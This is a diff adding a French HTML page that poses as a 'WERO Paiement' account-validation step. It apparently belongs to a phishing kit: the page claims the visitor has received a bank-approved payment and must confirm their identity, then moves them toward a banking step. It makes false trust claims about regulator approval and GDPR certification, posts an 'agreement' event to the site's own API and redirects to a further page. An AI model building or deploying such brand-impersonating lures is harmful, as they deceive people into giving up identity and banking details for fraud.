@@ -1,0 +1,927 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validation du Compte - WERO Paiement</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #FFD500;
+      --primary-dark: #F4C500;
+      --black: #0A0E27;
+      --white: #FFFFFF;
+      --accent-green: #10B981;
+      --accent-blue: #3B82F6;
+      --accent-orange: #FF6B00;
+      --gray-100: #F3F4F6;
+      --gray-600: #4B5563;
+      --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.15);
+      --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(135deg, #FFD500 0%, #FFEB3B 50%, #FFC107 100%);
+      color: var(--black);
+      line-height: 1.6;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* HEADER */
+    header {
+      background: rgba(255, 213, 0, 0.95);
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+      padding: 12px 0;
+    }
+
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      color: var(--black);
+      animation: logoGlow 3s ease-in-out infinite;
+    }
+
+    @keyframes logoGlow {
+      0%, 100% { filter: drop-shadow(0 0 0px rgba(0,0,0,0.1)); }
+      50% { filter: drop-shadow(0 0 8px rgba(0,0,0,0.2)); }
+    }
+
+    .desktop-nav {
+      display: flex;
+      gap: 10px;
+    }
+
+    .desktop-nav a {
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 15px;
+      padding: 10px 18px;
+      border-radius: 12px;
+      transition: var(--transition);
+    }
+
+    .desktop-nav a:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 32px;
+      height: 24px;
+      position: relative;
+      z-index: 1001;
+    }
+
+    .mobile-menu-btn span {
+      display: block;
+      width: 100%;
+      height: 2.5px;
+      background: var(--black);
+      border-radius: 2px;
+      transition: var(--transition);
+      position: absolute;
+    }
+
+    .mobile-menu-btn span:nth-child(1) { top: 2px; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 20px; }
+
+    .mobile-menu-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      z-index: 999;
+      opacity: 0;
+    }
+
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 85%;
+      max-width: 400px;
+      height: 100%;
+      background: #FFD500;
+      z-index: 1000;
+      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.2);
+      transition: right var(--transition);
+      flex-direction: column;
+    }
+
+    .mobile-nav.active {
+      right: 0;
+    }
+
+    .mobile-nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+
+    .mobile-menu-close:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-nav-links {
+      flex: 1;
+      padding: 20px 0;
+    }
+
+    .mobile-nav-links a {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 16px 24px;
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 16px;
+      transition: var(--transition);
+      border-left: 4px solid transparent;
+    }
+
+    .mobile-nav-links a:hover {
+      background: rgba(0, 0, 0, 0.08);
+      border-left-color: var(--black);
+    }
+
+    .mobile-nav-footer {
+      padding: 20px;
+      text-align: center;
+      border-top: 1px solid rgba(0, 0, 0, 0.1);
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    /* ANIMATIONS SLIDE */
+    @keyframes slideInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-40px) rotateX(10deg);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) rotateX(0deg);
+      }
+    }
+
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes scaleIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    /* HERO SECTION */
+    .hero-section {
+      padding: 80px 0 60px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-section::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -10%;
+      width: 600px;
+      height: 600px;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .hero-section h1 {
+      font-size: 48px;
+      font-weight: 900;
+      margin-bottom: 20px;
+      color: var(--black);
+      letter-spacing: -1px;
+      animation: slideInDown 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+      line-height: 1.2;
+    }
+
+    .hero-section p {
+      font-size: 18px;
+      color: rgba(0, 0, 0, 0.7);
+      max-width: 650px;
+      margin: 0 auto;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
+      font-weight: 500;
+    }
+
+    /* MAIN CONTENT */
+    main {
+      flex: 1;
+      padding: 60px 0;
+    }
+
+    .content-wrapper {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 24px;
+      padding: 50px 40px;
+      box-shadow: var(--shadow-lg);
+      max-width: 850px;
+      margin: 40px auto;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
+    }
+
+    /* PROGRESS SECTION */
+    .progress-section {
+      margin-bottom: 50px;
+      text-align: center;
+    }
+
+    .progress-header {
+      margin-bottom: 40px;
+    }
+
+    .progress-header h2 {
+      font-size: 28px;
+      font-weight: 900;
+      color: var(--black);
+      margin-bottom: 15px;
+    }
+
+    .progress-badge {
+      display: inline-block;
+      background: rgba(16, 185, 129, 0.1);
+      color: var(--accent-green);
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-weight: 700;
+      font-size: 14px;
+      border: 2px solid var(--accent-green);
+      animation: scaleIn 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.4s backwards;
+    }
+
+    /* PROGRESS BAR */
+    .progress-container {
+      margin: 40px 0;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      font-weight: 700;
+      font-size: 15px;
+    }
+
+    .progress-label span:last-child {
+      color: var(--accent-green);
+      font-size: 24px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 12px;
+      background: var(--gray-100);
+      border-radius: 10px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--accent-green), #06B6D4);
+      border-radius: 10px;
+      width: 50%;
+      position: relative;
+      transition: width 1.5s ease-in-out;
+      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+    }
+
+    .progress-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, 
+        rgba(255,255,255,0.2) 0%, 
+        rgba(255,255,255,0.4) 50%, 
+        rgba(255,255,255,0.2) 100%);
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    /* STATUS INDICATORS */
+    .status-indicators {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+      margin-top: 50px;
+      position: relative;
+    }
+
+    .status-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .status-step:nth-child(1) { animation-delay: 0.4s; }
+    .status-step:nth-child(2) { animation-delay: 0.5s; }
+    .status-step:nth-child(3) { animation-delay: 0.6s; }
+    .status-step:nth-child(4) { animation-delay: 0.7s; }
+
+    .step-icon {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background: var(--gray-100);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 12px;
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--gray-600);
+      transition: var(--transition);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+
+    .status-step.completed .step-icon {
+      background: var(--accent-green);
+      color: var(--white);
+      box-shadow: 0 4px 20px rgba(16, 185, 129, 0.3);
+    }
+
+    .status-step.active .step-icon {
+      background: var(--accent-blue);
+      color: var(--white);
+      box-shadow: 0 4px 20px rgba(59, 130, 246, 0.3);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 4px 20px rgba(59, 130, 246, 0.3); }
+      50% { box-shadow: 0 4px 25px rgba(59, 130, 246, 0.5); }
+    }
+
+    .step-label {
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+      max-width: 100px;
+      color: var(--black);
+    }
+
+    /* INFO CARDS */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      margin: 50px 0;
+    }
+
+    .info-card {
+      background: var(--gray-100);
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+      transition: var(--transition);
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .info-card:nth-child(1) { animation-delay: 0.5s; }
+    .info-card:nth-child(2) { animation-delay: 0.65s; }
+    .info-card:nth-child(3) { animation-delay: 0.8s; }
+
+    .info-card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.12);
+    }
+
+    .info-card i {
+      font-size: 32px;
+      color: var(--accent-green);
+      margin-bottom: 12px;
+      display: block;
+    }
+
+    .info-card h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+      margin-bottom: 8px;
+    }
+
+    .info-card p {
+      font-size: 12px;
+      color: var(--gray-600);
+    }
+
+    /* WARNING BOX */
+    .warning-box {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.08) 0%, rgba(59, 130, 246, 0.08) 100%);
+      border-left: 5px solid var(--accent-green);
+      border-radius: 16px;
+      padding: 30px;
+      margin: 40px 0;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.6s backwards;
+    }
+
+    .warning-box h3 {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--black);
+      margin-bottom: 15px;
+    }
+
+    .warning-box i {
+      color: var(--accent-green);
+      font-size: 24px;
+    }
+
+    .warning-box p {
+      font-size: 15px;
+      color: var(--gray-600);
+      line-height: 1.7;
+      margin-bottom: 12px;
+    }
+
+    .warning-box p:last-child {
+      margin-bottom: 0;
+      font-weight: 600;
+    }
+
+    /* BUTTON */
+    .activation-button {
+      position: relative;
+      overflow: hidden;
+      padding: 20px 50px;
+      border: none;
+      border-radius: 16px;
+      font-weight: 900;
+      font-size: 18px;
+      cursor: pointer;
+      transition: var(--transition);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      background: linear-gradient(135deg, var(--accent-green), #06B6D4);
+      color: var(--white);
+      box-shadow: 0 12px 30px rgba(16, 185, 129, 0.3);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-top: 40px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.75s backwards;
+    }
+
+    .activation-button:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.4);
+    }
+
+    .activation-button:active {
+      transform: translateY(-2px);
+    }
+
+    .activation-button i {
+      font-size: 20px;
+    }
+
+    /* FOOTER */
+    footer {
+      background: var(--black);
+      color: var(--white);
+      padding: 80px 0 40px;
+      margin-top: 60px;
+      border-top: 2px solid rgba(255, 213, 0, 0.3);
+    }
+
+    .footer-content {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 60px;
+      margin-bottom: 50px;
+    }
+
+    .footer-section {
+      flex: 1;
+      min-width: 250px;
+      text-align: center;
+    }
+
+    .footer-section h3 {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #FFD500;
+      font-weight: 700;
+    }
+
+    .footer-section p {
+      font-size: 14px;
+      opacity: 0.8;
+      margin-bottom: 10px;
+    }
+
+    .footer-section a {
+      display: block;
+      color: var(--white);
+      text-decoration: none;
+      font-size: 14px;
+      opacity: 0.7;
+      transition: var(--transition);
+      margin-bottom: 8px;
+    }
+
+    .footer-section a:hover {
+      opacity: 1;
+      color: #FFD500;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      padding-top: 30px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      opacity: 0.6;
+      font-size: 14px;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+
+      .logo { font-size: 28px; }
+      .hero-section h1 { font-size: 36px; }
+      .hero-section p { font-size: 16px; }
+      .content-wrapper { padding: 30px 20px; }
+      .progress-header h2 { font-size: 24px; }
+
+      .status-indicators {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 15px;
+      }
+
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .warning-box {
+        padding: 20px;
+      }
+
+      .activation-button {
+        padding: 16px 40px;
+        font-size: 16px;
+        width: 100%;
+      }
+
+      .footer-content {
+        gap: 30px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .hero-section h1 { font-size: 28px; }
+      .hero-section p { font-size: 15px; }
+      .progress-header h2 { font-size: 20px; }
+      .progress-label span:last-child { font-size: 20px; }
+      
+      .status-indicators {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin-top: 30px;
+      }
+
+      .step-icon {
+        width: 40px;
+        height: 40px;
+        font-size: 16px;
+      }
+
+      .step-label {
+        font-size: 12px;
+        max-width: 80px;
+      }
+
+      .warning-box h3 {
+        font-size: 16px;
+      }
+
+      .warning-box p {
+        font-size: 14px;
+      }
+
+      .activation-button {
+        padding: 14px 30px;
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-container">
+      <div class="logo">WERO</div>
+      
+      <nav class="desktop-nav">
+        <a href="/">Accueil</a>
+        <a href="/accords" class="active">Validation</a>
+      </nav>
+      
+      <button class="mobile-menu-btn">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <div class="mobile-menu-overlay"></div>
+      
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">WERO</div>
+          <button class="mobile-menu-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="/">Accueil</a>
+          <a href="/accords" class="active">Validation</a>
+        </div>
+        <div class="mobile-nav-footer">
+          <p>Sécurisé et vérifié</p>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <!-- HERO -->
+  <section class="hero-section">
+    <div class="container">
+      <h1>✅ Validation de votre compte</h1>
+      <p>Confirmez votre identité pour accéder aux transferts illimités et débloquer tous les avantages WERO</p>
+    </div>
+  </section>
+
+  <!-- MAIN CONTENT -->
+  <main>
+    <div class="container">
+      <div class="content-wrapper">
+        
+        <!-- PROGRESS -->
+        <section class="progress-section">
+          <div class="progress-header">
+            <h2>Étape 2 sur 4</h2>
+            <div class="progress-badge">🔐 Vérification d'identité</div>
+          </div>
+          
+          <div class="progress-container">
+            <div class="progress-label">
+              <span>Progression globale</span>
+              <span>50%</span>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-fill" id="progressFill"></div>
+            </div>
+          </div>
+          
+          <!-- STATUS STEPS -->
+          <div class="status-indicators">
+            <div class="status-step completed">
+              <div class="step-icon"><i class="fas fa-check"></i></div>
+              <div class="step-label">Inscription</div>
+            </div>
+            <div class="status-step active">
+              <div class="step-icon">2</div>
+              <div class="step-label">Identité</div>
+            </div>
+            <div class="status-step">
+              <div class="step-icon">3</div>
+              <div class="step-label">Banque</div>
+            </div>
+            <div class="status-step">
+              <div class="step-icon">4</div>
+              <div class="step-label">Confirmé</div>
+            </div>
+          </div>
+        </section>
+
+        <!-- INFO CARDS -->
+        <div class="info-grid">
+          <div class="info-card">
+            <i class="fas fa-shield-alt"></i>
+            <h4>Cryptage SSL</h4>
+            <p>Données 100% sécurisées</p>
+          </div>
+          <div class="info-card">
+            <i class="fas fa-clock"></i>
+            <h4>2 minutes</h4>
+            <p>Validation rapide</p>
+          </div>
+          <div class="info-card">
+            <i class="fas fa-check-circle"></i>
+            <h4>Approuvé</h4>
+            <p>Par les régulateurs</p>
+          </div>
+        </div>
+
+        <!-- WARNING BOX -->
+        <div class="warning-box">
+          <h3>
+            <i class="fas fa-info-circle"></i>
+            Information importante
+          </h3>
+          <p>Vous avez reçu un paiement approuvé par la banque de l'émetteur. Pour respecter les normes de sécurité et lutter contre la fraude, la confirmation de votre identité est obligatoire.</p>
+          <p>Cette vérification protège votre compte et vous permet d'accéder à tous les services WERO sans limitation.</p>
+          <p>✅ Processus certifié conforme RGPD et normes bancaires</p>
+        </div>
+
+        <!-- BUTTON -->
+        <div style="text-align: center;">
+          <button class="activation-button" id="activateButton">
+            <i class="fas fa-play-circle"></i>
+            CONFIRMER MON IDENTITÉ
+          </button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>WERO</h3>
+          <p>Paiement Instantané Sécurisé</p>
+        </div>
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="/">Accueil</a>
+          <a href="/accords">Validation</a>
+          <a href="/premiere">Vérification</a>
+        </div>
+        <div class="footer-section">
+          <h3>Conformité</h3>
+          <a href="#">Politique RGPD</a>
+          <a href="#">Conditions</a>
+          <a href="#">Sécurité</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2024 WERO. Tous droits réservés.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        mobileMenuBtn.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        mobileMenuBtn.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+      
+      const activateButton = document.getElementById('activateButton');
+      const progressFill = document.getElementById('progressFill');
+      
+      activateButton.addEventListener('click', async function() {
+        try {
+          await fetch('/api/send-agreement', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'Agreement Accepted' })
+          });
+        } catch (error) {
+          console.error('Erreur:', error);
+        }
+        
+        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> APPROBATION...';
+        this.disabled = true;
+        
+        let progress = 50;
+        const interval = setInterval(() => {
+          progress += 5;
+          progressFill.style.width = progress + '%';
+          
+          if (progress >= 100) {
+            clearInterval(interval);
+            document.querySelectorAll('.status-step').forEach((step, i) => {
+              if (i < 3) {
+                step.classList.add('completed');
+                step.classList.remove('active');
+              }
+              if (i === 3) step.classList.add('active');
+            });
+            
+            setTimeout(() => {
+              window.location.href = "/premiere";
+            }, 1500);
+          }
+        }, 200);
+      });
+    });
+  </script>
+</body>
+</html>
